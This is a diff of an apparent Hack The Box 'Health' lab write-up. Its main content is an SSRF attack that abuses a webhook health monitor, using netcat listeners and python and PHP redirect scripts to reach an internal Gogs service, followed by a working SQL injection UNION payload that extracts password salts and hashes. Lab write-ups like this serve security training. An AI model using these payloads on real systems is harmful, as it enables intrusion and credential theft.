@@ -48,7 +48,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Read data files from: /usr/bin/../share/nmap
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 # Nmap done at Wed Jan 11 12:06:40 2023 -- 1 IP address (1 host up) scanned in 77.77 seconds
-</pre></table></code></div></div><p>In this box only two ports were open, the <code class="language-plaintext highlighter-rouge">ssh</code> port and <code class="language-plaintext highlighter-rouge">webapp</code> port also there is another <code class="language-plaintext highlighter-rouge">filtered</code> port, port <code class="language-plaintext highlighter-rouge">3000</code>. This port seems to be handled by firewall and seems as there some sort of redirection required. Then i decide to visit the web-application hosted at port <code class="language-plaintext highlighter-rouge">80</code> and found this page:-</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/health/00.png" alt="image" /></p><p>The page requires to a <code class="language-plaintext highlighter-rouge">url</code> to be monitored then i entered the followings:-</p><p><strong>In my Linux machine(Attacker’s machine)</strong></p><ol><li>Hosting anything for testing.<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></table></code></div></div><p>In this box only two ports were open, the <code class="language-plaintext highlighter-rouge">ssh</code> port and <code class="language-plaintext highlighter-rouge">webapp</code> port and also there is another <code class="language-plaintext highlighter-rouge">filtered</code> port, port <code class="language-plaintext highlighter-rouge">3000</code>. This port seems to be handled by firewall and seems as there is some sort of redirection required. Lets visit the web-application hosted at port <code class="language-plaintext highlighter-rouge">80</code> and see what is with this page:-</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/health/00.png" alt="image" /></p><p>The page requires to a <code class="language-plaintext highlighter-rouge">url</code> to be monitored then i entered the followings:-</p><p><strong>In my Linux machine(Attacker’s machine)</strong></p><ol><li>Hosting anything for testing.<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 </pre><td class="rouge-code"><pre>┌──(egovridc㉿egovridc)-[~/C7F5/htb/health/www]
 └─$ python3 -m http.server 80
@@ -56,7 +56,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 2
 </pre><td class="rouge-code"><pre>┌──(egovridc㉿egovridc)-[~/C7F5/htb/health/www]
 └─$ nc -nlvp 1235 
-</pre></table></code></div></div></li></ol><p><strong>In Web application</strong></p><ol><li>In payload URL <code class="language-plaintext highlighter-rouge">http://10.10.14.18:1235</code></li><li>In Monitored URL <code class="language-plaintext highlighter-rouge">http://10.10.14.18</code> And then entered the interval and then testing it.</li></ol><p><strong>Results</strong></p><p>In web application the result seems to be health</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/health/01.png" alt="image" /></p><p>On Linux machine there is also a hit, the</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></table></code></div></div></li></ol><p><strong>In Web application</strong></p><ol><li>In payload URL <code class="language-plaintext highlighter-rouge">http://10.10.14.18:1235</code></li><li>In Monitored URL <code class="language-plaintext highlighter-rouge">http://10.10.14.18</code> And then entered the interval and then testing it.</li></ol><p><strong>Results</strong></p><p>In web application the result seems to be health</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/health/01.png" alt="image" /></p><p>On Linux machine there is also a hit,</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
@@ -64,7 +64,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 └─$ python3 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 10.10.11.176 - - [05/Oct/2022 12:17:10] "GET / HTTP/1.0" 200 
-</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">netcat</code> returned a hit but seem it has all the outputs from my machine, for the initial step its cool but the main goal here is trying to have access to the <code class="language-plaintext highlighter-rouge">127.0.0.1:3000</code> to see what is with it.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">netcat</code> returned a hit but seem it has all the outputs from my machine, for the initial step it’s cool but the main goal here is trying to have access to the <code class="language-plaintext highlighter-rouge">127.0.0.1:3000</code> and see what is with it.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
@@ -86,7 +86,7 @@ Content-type: application/json
 Content-Length: 673
 
 {"webhookUrl":"http:\/\/10.10.14.18:1235","monitoredUrl":"http:\/\/10.10.14.18","health":"up","body":"&lt;!DOCTYPE HTML PUBLIC \"-\/\/W3C\/\/DTD HTML 4.01\/\/EN\" \"http:\/\/www.w3.org\/TR\/html4\/strict.dtd\"&gt;\n&lt;html&gt;\n&lt;head&gt;\n&lt;meta http-equiv=\"Content-Type\" content=\"text\/html; charset=utf-8\"&gt;\n&lt;title&gt;Directory listing for \/&lt;\/title&gt;\n&lt;\/head&gt;\n&lt;body&gt;\n&lt;h1&gt;Directory listing for \/&lt;\/h1&gt;\n&lt;hr&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;a href=\"health\"&gt;health&lt;\/a&gt;&lt;\/li&gt;\n&lt;\/ul&gt;\n&lt;hr&gt;\n&lt;\/body&gt;\n&lt;\/html&gt;\n","message":"HTTP\/1.0 200 OK","headers":{"Server":"SimpleHTTP\/0.6 Python\/3.10.7","Date":"Wed, 05 Oct 2022 09:18:51 GMT","Content-type":"text\/html; charset=utf-8","Content-Length":"334"}}
-</pre></table></code></div></div><p>The above result shows that the result obtained is from <code class="language-plaintext highlighter-rouge">http://10.10.14.18</code> but we want to get result form <code class="language-plaintext highlighter-rouge">http://127.0.0.1:3000</code></p><h3 id="redirection-to-localhost-web-hook">Redirection to localhost web-hook</h3><p>The redirection can be performed by two methods one by using <code class="language-plaintext highlighter-rouge">python</code> and another by using <code class="language-plaintext highlighter-rouge">php</code></p><p><strong>Redirection by using <code class="language-plaintext highlighter-rouge">python</code></strong> This code will redirect the <code class="language-plaintext highlighter-rouge">Location</code> from <code class="language-plaintext highlighter-rouge">10.10.11.176</code> to <code class="language-plaintext highlighter-rouge">127.0.0.1:3000</code> run the code as <code class="language-plaintext highlighter-rouge">python3 exploit.py 3000</code></p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></table></code></div></div><h3 id="redirection-to-localhost-web-hook">Redirection to localhost web-hook</h3><p>Redirection can be performed by two methods one by using <code class="language-plaintext highlighter-rouge">python</code> and another by using <code class="language-plaintext highlighter-rouge">php</code></p><p><strong>Redirection by using <code class="language-plaintext highlighter-rouge">python</code></strong></p><p>This code will redirect the <code class="language-plaintext highlighter-rouge">Location</code> from <code class="language-plaintext highlighter-rouge">10.10.11.176</code> to <code class="language-plaintext highlighter-rouge">127.0.0.1:3000</code> run the code as <code class="language-plaintext highlighter-rouge">python3 exploit.py 3000</code></p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
@@ -121,28 +121,48 @@ Content-Length: 673
 </pre></table></code></div></div><p>On web application enter the address links as before.</p></li><li>Click the test button then you will have the result.</li></ol><p><strong>Redirection by using <code class="language-plaintext highlighter-rouge">php</code></strong></p><div class="language-php highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
+4
 </pre><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
 <span class="nb">header</span><span class="p">(</span><span class="s2">"Location: http://127.0.0.1:3000"</span><span class="p">);</span>
 <span class="k">die</span><span class="p">();</span>
+<span class="cp">?&gt;</span>
 </pre></table></code></div></div><ol><li>Host the file by using <code class="language-plaintext highlighter-rouge">php</code><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 </pre><td class="rouge-code"><pre>┌──(egovridc㉿egovridc)-[~/C7F5/htb/health/exploit]
-└─$ php -S 0.0.0.0:8
+└─$ php -S 0.0.0.0:80
 </pre></table></code></div></div></li><li>Listen with <code class="language-plaintext highlighter-rouge">netcat</code> as before<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 </pre><td class="rouge-code"><pre>┌──(egovridc㉿egovridc)-[~/C7F5/htb/health/www]
 └─$ nc -nlvp 1235
-</pre></table></code></div></div></li><li>Then send the request in the web browser.</li></ol><p><strong>Result</strong></p><p>Both methods will result to the following output.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></table></code></div></div></li><li>Then send request to the web browser.</li></ol><p><strong>Result</strong></p><p>Both methods will result to the following output.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
-</pre><td class="rouge-code"><pre>┌──(egovridc㉿egovridc)-[~/C7F5/htb/health/www]                                                                                                        └─$ nc -nlvp 1235                                                                                                                                            listening on [any] 1234 ...                                                                                                                                    connect to [10.10.14.21] from (UNKNOWN) [10.10.11.176] 41024                                                                                                   POST / HTTP/1.1                                                                                                                                                Host: 10.10.14.21:1234                                                                                                                                         Accept: */*                                                                                                                                                    Content-type: application/json                                                                                                                                 Content-Length: 7733                                                                                                                                           Expect: 100-continue    
+4
+5
+6
+7
+8
+9
+10
+11
+12
+</pre><td class="rouge-code"><pre>┌──(egovridc㉿egovridc)-[~/C7F5/htb/health/www]
+└─$ nc -nlvp 1235
+listening on [any] 1235 ...
+connect to [10.10.14.21] from (UNKNOWN) [10.10.11.176] 41024
+POST / HTTP/1.1
+Host: 10.10.14.21:1235
+Accept: */*
+Content-type: application/json
+Content-Length: 7733
+Expect: 100-continue    
 
 {"webhookUrl":"http:\/\/10.10.14.21:1234","monitoredUrl":"http:\/\/10.10.14.21","health":"up","body":"&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n\t&lt;head data-suburl=\"\"&gt;\n\t\t&lt;meta http-equiv=\"Content-Type\" content=\"text\/html; charset=UTF-8\" \/&gt;\n        &lt;meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\"\/&gt;\n        &lt;meta name=\"author\" content=\"Gogs - Go Git Service\" \/&gt;\n\t\t&lt;meta name=\"description\" content=\"Gogs(Go Git Service) a painless self-hosted Git Service written in Go\" \/&gt;\n\t\t&lt;meta name=\"keywords\" content=\"go, git, self-hosted, gogs\"&gt;\n\t\t&lt;meta name=\"_csrf\" content=\"k5-MAum4s1tawmByRJJToJ9EG5E6MTY3MzQzMjE2NDc2MjI3NzA4Mw==\" \/&gt;\n\t\t\n\n\t\t&lt;link rel=\"shortcut icon\
 </pre></table></code></div></div><p>To make the result readable use <code class="language-plaintext highlighter-rouge">jq</code> for the <code class="language-plaintext highlighter-rouge">json</code> readability and then redirect to the <code class="language-plaintext highlighter-rouge">html</code> file which you will browse it to see its structure.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 </pre><td class="rouge-code"><pre>┌──(egovridc㉿egovridc)-[~/C7F5/htb/health/data]
 └─$ cat web| jq -r .body &gt; res.hmtl
-</pre></table></code></div></div><p>Then open the <code class="language-plaintext highlighter-rouge">res.html</code> file by your favorite browser to see how it looks like.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/health/07.png" alt="image" /></p><p>This will result to some interesting results which shows what application is run on localhost and this is <code class="language-plaintext highlighter-rouge">Gogs - Go Git Service</code> <code class="language-plaintext highlighter-rouge">2014 GoGits \u00b7 Version: 0.5.5.1010</code> this shows the version of the <code class="language-plaintext highlighter-rouge">gogs</code></p><p>On searching on exploit db we will find two <code class="language-plaintext highlighter-rouge">txt</code> files which shows that the <code class="language-plaintext highlighter-rouge">gogs</code> version is vulnerable to <code class="language-plaintext highlighter-rouge">sqlinjection</code></p><p><strong>Command</strong></p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></table></code></div></div><p>Then open the <code class="language-plaintext highlighter-rouge">res.html</code> file by your favorite browser to see how it looks like.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/health/07.png" alt="image" /></p><p>This will result to some interesting results which shows what application is run on localhost and this is <code class="language-plaintext highlighter-rouge">Gogs - Go Git Service</code> <code class="language-plaintext highlighter-rouge">2014 GoGits \u00b7 Version: 0.5.5.1010</code> this shows the version of the <code class="language-plaintext highlighter-rouge">gogs</code></p><p>After searching in exploit db i found two <code class="language-plaintext highlighter-rouge">txt</code> files which shows that the <code class="language-plaintext highlighter-rouge">gogs</code> version is vulnerable to <code class="language-plaintext highlighter-rouge">sqlinjection</code></p><p><strong>Command</strong></p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 </pre><td class="rouge-code"><pre>┌──(egovridc㉿egovridc)-[~/C7F5/htb/health]
 └─$ searchsploit gogs                            
@@ -175,39 +195,19 @@ Gogs - 'users'/'repos' '?q' SQL Injection     | multiple/webapps/35238.txt
 11
 12
 13
-14
-15
-16
-17
-18
-19
-20
-21
-22
-23
 </pre><td class="rouge-code"><pre>┌──(egovridc㉿egovridc)-[~/…/htb/health/gogs_local/gogs]
-└─$ ./gogs         
-NAME:
-   Gogs - Go Git Service
-
-USAGE:
-   Gogs [global options] command [command options] [arguments...]
-
-VERSION:
-   0.5.5.1010 Beta
-
-COMMANDS:
-   web          Start Gogs web server
-   serv         This command should only be called by SSH shell
-   update       This command should only be called by SSH shell
-   fix          This command for upgrade from old version
-   dump         Dump Gogs files and database
-   cert         Generate self-signed certificate
-   help, h      Shows a list of commands or help for one command
-   
-GLOBAL OPTIONS:
-   --help, -h           show help
-   --version, -v        print the version
+└─$ ./gogs web
+2023/01/11 19:55:03 [T] Custom path: /home/egovridc/C7F5/htb/Machines/health/exploit/gogs/gogs/custom
+2023/01/11 19:55:03 [T] Log path: /home/egovridc/C7F5/htb/Machines/health/exploit/gogs/gogs/log
+2023/01/11 19:55:03 [I] Gogs: Go Git Service 0.5.5.1010 Beta
+2023/01/11 19:55:03 [I] Log Mode: File(Trace)
+2023/01/11 19:55:03 [I] Redis Enabled
+2023/01/11 19:55:03 [I] Memcache Enabled
+2023/01/11 19:55:03 [I] Cache Service Enabled
+2023/01/11 19:55:03 [I] Session Service Enabled
+2023/01/11 19:55:03 [I] SQLite3 Enabled
+2023/01/11 19:55:03 [I] Run Mode: Production
+2023/01/11 19:55:03 [I] Listen: http://0.0.0.0:3000
 </pre></table></code></div></div><p>If you run the <code class="language-plaintext highlighter-rouge">gogs</code> binary it will prompt the version which is similar to our version in machine</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/health/03.png" alt="image" /></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/health/04.png" alt="image" /></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/health/05.png" alt="image" /></p><p>If you check on source codes these are exactly as those we have in the box</p><h3 id="sql-injection">SQL injection</h3><p>There is no need to<code class="language-plaintext highlighter-rouge">bruteforce</code> the columns and table because i can access it from the <code class="language-plaintext highlighter-rouge">gogs</code> in <code class="language-plaintext highlighter-rouge">data</code>. For me am only interested in table <code class="language-plaintext highlighter-rouge">user</code> which have the following columns:-</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
@@ -278,7 +278,7 @@ LL, `num_members` INTEGER NULL)
  `description` TEXT NULL 
  `num_teams` INTEGER NULL 
  `num_members` INTEGER NULL))
-</pre></table></code></div></div><p>Then lets extract data from this local <code class="language-plaintext highlighter-rouge">gogs</code> and then every successful payload will be used to attack the box. <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/health/09.png" alt="image" /> <strong>Payload</strong></p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></table></code></div></div><p>Then lets extract data from this local <code class="language-plaintext highlighter-rouge">gogs</code> and then every successful payload will be used to attack the box. <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/health/09.png" alt="image" /></p><p><strong>Payload</strong></p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 </pre><td class="rouge-code"><pre>')/**/UNION/**/ALL/**/SELECT/**/1,2,(select/**/salt/**/from/**/user)||':'||(select/**/passwd/**/from/**/user),4,5,6,7,8,9,0,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27--/**/- 
 </pre></table></code></div></div><p><strong>Result</strong></p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
